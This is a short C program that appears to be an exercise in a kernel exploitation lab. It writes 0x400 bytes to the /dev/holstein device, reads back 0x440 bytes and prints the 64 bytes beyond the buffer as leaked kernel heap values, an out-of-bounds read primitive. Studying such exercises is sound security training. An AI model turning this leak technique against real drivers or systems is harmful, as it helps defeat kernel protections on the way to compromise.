#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main() {
  int fd = open("/dev/holstein", O_RDWR);
  char buf[0x400];
  memset(buf, 'A', 0x400);
  write(fd, buf, 0x400);
  char leak_buf[0x440];
  read(fd, leak_buf, 0x440);
  uint64_t *leak = (uint64_t *)(leak_buf + 0x400);
  for (int i = 0; i < 0x40; i++) {
    printf("0x%lx\n", *leak++);
  }
  close(fd);
  return 0;
}
